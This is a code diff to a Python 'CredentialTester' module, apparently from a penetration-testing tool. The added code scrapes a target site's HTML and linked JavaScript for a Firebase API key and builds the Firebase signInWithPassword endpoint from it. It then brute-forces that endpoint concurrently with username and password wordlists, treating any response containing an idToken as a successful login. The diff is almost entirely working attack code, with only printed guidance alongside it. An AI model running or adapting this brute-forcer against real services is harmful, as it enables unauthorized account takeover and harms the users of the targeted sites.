@@ -70,15 +70,63 @@ class CredentialTester(BaseModule):
         if kwargs.get('max_usernames'): self._max_usernames  = kwargs['max_usernames']
         if kwargs.get('max_passwords'): self._max_passwords  = kwargs['max_passwords']
 
+        import urllib.request, urllib.error, re
+
         target_url = target if target.startswith(('http://', 'https://')) else f"https://{target}"
+
+        # ── Resolve the real Firebase endpoint ───────────────────────────────
+        # If user already passed the identitytoolkit URL, use it directly
+        if 'identitytoolkit.googleapis.com' in target_url:
+            firebase_url = target_url
+            print(f"\033[92m[+] Using Firebase URL directly\033[0m")
+        else:
+            # Fetch the page and extract the API key
+            print(f"\033[96m[*] Fetching {target_url} to extract Firebase API key...\033[0m")
+            firebase_url = None
+            try:
+                req = urllib.request.Request(target_url,
+                    headers={'User-Agent': 'Mozilla/5.0'})
+                with urllib.request.urlopen(req, timeout=10) as r:
+                    page = r.read().decode('utf-8', errors='ignore')
+
+                # Look for apiKey in page source
+                m = re.search(r'apiKey["\'\s]*[:=]["\'\s]*([A-Za-z0-9_\-]{20,})', page)
+                if not m:
+                    # Try linked JS files
+                    js_files = re.findall(r'src=["\'](https?://[^"\']+\.js|/[^"\']+\.js)["\']]', page)
+                    for js in js_files[:8]:
+                        js_url = js if js.startswith('http') else f"https://{urllib.parse.urlparse(target_url).netloc}{js}"
+                        try:
+                            with urllib.request.urlopen(js_url, timeout=8) as jr:
+                                jt = jr.read().decode('utf-8', errors='ignore')
+                            m = re.search(r'apiKey["\'\s]*[:=]["\'\s]*([A-Za-z0-9_\-]{20,})', jt)
+                            if m:
+                                break
+                        except Exception:
+                            pass
+
+                if m:
+                    api_key = m.group(1)
+                    firebase_url = (f"https://identitytoolkit.googleapis.com/v1/"
+                                    f"accounts:signInWithPassword?key={api_key}")
+                    print(f"\033[92m[+] Firebase API key found! Endpoint ready.\033[0m")
+                else:
+                    print(f"\033[91m[!] Could not auto-extract Firebase API key.\033[0m")
+                    print(f"\033[93m    Run with the Firebase URL directly:\033[0m")
+                    print(f"\033[93m    1. Open DevTools → Network → login with anything\033[0m")
+                    print(f"\033[93m    2. Copy the identitytoolkit URL\033[0m")
+                    print(f"\033[93m    3. Use that as -t target\033[0m")
+                    return self.findings
+            except Exception as e:
+                print(f"\033[91m[!] Failed to fetch page: {e}\033[0m")
+                return self.findings
 
         ulist_label = self.custom_userlist or f"{self.wordlist_path}/usernames.txt"
         plist_label = self.custom_passlist or f"{self.wordlist_path}/passwords.txt"
-        print(f"\033[96m[*] Target   : {target_url}\033[0m")
         print(f"\033[96m[*] Userlist : {ulist_label}\033[0m")
         print(f"\033[96m[*] Passlist : {plist_label}\033[0m\n")
 
-        await self._test_brute_force({'url': target_url, 'form_type': 'direct'})
+        await self._test_brute_force({'url': firebase_url, 'form_type': 'firebase'})
         return self.findings
 
 
@@ -546,18 +594,19 @@ class CredentialTester(BaseModule):
     # Core brute-force loop — concurrent with live progress bar
     # ─────────────────────────────────────────────────────────────────────────
     async def _test_brute_force(self, endpoint: Dict):
-        import itertools
-        import json as _json
+        import itertools, json as _json, urllib.request, urllib.error
 
-        url          = endpoint['url']
-        counter      = [0]
-        found_event  = asyncio.Event()
-        rate_limited = [False]
-        semaphore    = asyncio.Semaphore(self.concurrency)
+        url       = endpoint['url']
+        form_type = endpoint.get('form_type', 'firebase')
 
         base_usernames, passwords = self._load_wordlists()
         all_usernames  = list(dict.fromkeys(base_usernames))
         total_attempts = len(all_usernames) * len(passwords)
+
+        semaphore    = asyncio.Semaphore(self.concurrency)
+        found_event  = asyncio.Event()
+        rate_limited = [False]
+        counter      = [0]
 
         print(f"\033[96m[*] Usernames : {len(all_usernames)}\033[0m")
         print(f"\033[96m[*] Passwords : {len(passwords)}\033[0m")
@@ -570,47 +619,37 @@ class CredentialTester(BaseModule):
                 if found_event.is_set():
                     return
                 try:
-                    # ── Attempt 1: JSON POST (works for Firebase + JSON APIs) ──
-                    json_body = _json.dumps({
-                        'email': username,
-                        'password': password,
-                        'returnSecureToken': True
-                    })
-                    resp = await self._make_request(
-                        url, method='POST',
-                        data=json_body,
-                        allow_redirects=False,
-                        headers={'Content-Type': 'application/json'})
+                    loop = asyncio.get_event_loop()
 
-                    # ── Attempt 2: form POST fallback ──────────────────────
-                    status_1 = resp.status if resp else 0
-                    if not resp or status_1 in [400, 404, 415, 422, 500]:
-                        form_body = {
-                            'email':    username,
-                            'username': username,
-                            'user':     username,
-                            'login':    username,
+                    def do_request():
+                        body = _json.dumps({
+                            'email': username,
                             'password': password,
-                            'passwd':   password,
-                        }
-                        resp = await self._make_request(
-                            url, method='POST',
-                            data=form_body,
-                            allow_redirects=False,
-                            headers={'Content-Type': 'application/x-www-form-urlencoded'})
+                            'returnSecureToken': True
+                        }).encode('utf-8')
+                        req = urllib.request.Request(
+                            url,
+                            data=body,
+                            headers={'Content-Type': 'application/json',
+                                     'User-Agent': 'Mozilla/5.0'},
+                            method='POST'
+                        )
+                        try:
+                            with urllib.request.urlopen(req, timeout=15) as r:
+                                return r.status, r.read().decode('utf-8', errors='ignore')
+                        except urllib.error.HTTPError as e:
+                            return e.code, e.read().decode('utf-8', errors='ignore')
+                        except Exception as ex:
+                            return 0, str(ex)
+
+                    status, text = await loop.run_in_executor(None, do_request)
+                    tl = text.lower()
 
                     counter[0] += 1
                     self._print_progress(counter[0], total_attempts,
                                          prefix=f'  \033[96m{username[:22]:<22}\033[0m')
 
-                    if not resp:
-                        return
-
-                    status = resp.status
-                    text   = await resp.text()
-                    tl     = text.lower()
-
-                    # Show first response so user can verify
+                    # Show first response for debugging
                     if counter[0] == 1:
                         sys.stdout.write('\n')
                         print(f"\033[90m[debug] HTTP {status} | {text[:300]}\033[0m\n")
@@ -620,39 +659,11 @@ class CredentialTester(BaseModule):
                         found_event.set()
                         return
 
-                    # ── SUCCESS CHECKS ────────────────────────────────────
-                    success = False
-
-                    # Firebase: idToken in response = logged in
-                    if any(k in tl for k in ['idtoken', '"localid"', 'refreshtoken']):
-                        success = True
-
-                    # Redirect to a success page
-                    elif status in [301, 302, 303, 307, 308]:
-                        loc = resp.headers.get('Location', '').lower()
-                        if any(p in loc for p in ['/dashboard','/admin','/home',
-                                                   '/panel','/welcome','/main']):
-                            success = True
-
-                    # JSON token response (non-Firebase APIs)
-                    elif 'application/json' in resp.headers.get('Content-Type', ''):
-                        if '"error"' not in tl:
-                            if any(k in tl for k in ['token', 'access_token', 'auth']):
-                                success = True
-
-                    # HTML: session cookie + no failure words
-                    elif status == 200:
-                        cookie = resp.headers.get('Set-Cookie', '').lower()
-                        fail   = ['invalid','incorrect','failed','wrong',
-                                   'denied','unauthorized','error','not found']
-                        if (any(c in cookie for c in ['session','token','auth','jwt'])
-                                and not any(f in tl for f in fail)):
-                            success = True
-
-                    if success:
+                    # ── SUCCESS: Firebase returns idToken on correct creds ──
+                    if 'idtoken' in tl:
                         sys.stdout.write('\n')
                         self._report_success(username, password, url, counter[0],
-                                             ['email', 'username'], 'password')
+                                             ['email'], 'password')
                         found_event.set()
 
                 except asyncio.CancelledError:
@@ -660,7 +671,7 @@ class CredentialTester(BaseModule):
                 except Exception as e:
                     counter[0] += 1
                     sys.stdout.write('\n')
-                    print(f"\033[91m[!] {username} → {type(e).__name__}: {e}\033[0m")
+                    print(f"\033[91m[!] {username} → {e}\033[0m")
 
         tasks = [asyncio.create_task(attempt(u, p))
                  for u, p in itertools.product(all_usernames, passwords)]
